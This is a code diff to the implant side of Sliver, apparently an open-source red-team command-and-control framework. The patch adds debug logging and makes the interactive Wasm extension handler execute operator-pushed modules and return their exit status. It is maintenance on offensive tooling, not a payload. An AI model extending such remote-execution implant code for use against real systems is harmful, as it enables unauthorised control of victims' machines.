@@ -29,6 +29,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -62,7 +63,7 @@ func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("Registering Wasm extension: %s", wasmExtReq.Name)
+	log.Printf("Registering Wasm extension: %s (%d bytes)", wasmExtReq.Name, len(wasmExtReq.WasmGz))
 	// {{end}}
 
 	// Cache the Wasm extension in the map until we receive a
@@ -132,7 +133,12 @@ func execWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Conn
 		// {{end}}
 		return
 	}
-	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, wasmBin, extReq.MemFS)
+
+	// {{if .Config.Debug}}
+	log.Printf("Decompressed size %d bytes", len(wasmBin))
+	// {{end}}
+
+	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, wasmBin, req.MemFS)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("error creating wasm extension: %v", err)
@@ -142,7 +148,7 @@ func execWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Conn
 
 	var data []byte
 	if req.Interactive {
-		runInteractive(req, connection, wasmExtRuntime)
+		data, _ = runInteractive(req, connection, wasmExtRuntime)
 	} else {
 		data, _ = runNonInteractive(req, wasmExtRuntime)
 	}
@@ -178,17 +184,19 @@ type WasmStdin struct {
 	wasm *extension.WasmExtension
 }
 
+// Write - Write to the stdin stream
 func (w *WasmStdin) Write(p []byte) (n int, err error) {
 	return w.wasm.Stdin.Write(p)
 }
 
+// Close - Close the stdin stream
 func (w *WasmStdin) Close() error {
 	return w.wasm.Close()
 }
 
-func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, wasm *extension.WasmExtension) {
+func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, wasm *extension.WasmExtension) ([]byte, error) {
 	// {{if .Config.Debug}}
-	log.Printf("Executing non-interactive wasm extension")
+	log.Printf("Executing interactive wasm extension on tunnel %d", req.TunnelID)
 	// {{end}}
 
 	tunnel := transports.NewTunnel(
@@ -199,4 +207,15 @@ func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, w
 	)
 	conn.AddTunnel(tunnel)
 
+	// Execute the Wasm extension
+	errMsg := ""
+	exitCode, err := wasm.Execute(req.Args)
+	if err != nil {
+		errMsg = err.Error()
+	}
+	data, _ := proto.Marshal(&sliverpb.ExecWasmExtension{
+		ExitCode: exitCode,
+		Response: &commonpb.Response{Err: errMsg},
+	})
+	return data, nil
 }
